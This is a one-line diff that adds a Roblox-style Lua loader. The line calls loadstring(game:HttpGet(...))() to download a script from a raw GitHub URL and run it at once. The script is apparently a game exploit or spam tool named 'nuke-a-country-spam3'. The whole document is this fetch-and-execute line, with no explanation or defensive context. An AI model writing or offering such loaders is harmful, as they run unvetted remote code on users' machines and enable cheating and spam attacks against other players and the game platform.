@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/nuke-a-country-spam3-icoviapwhij6pv.lua"))()
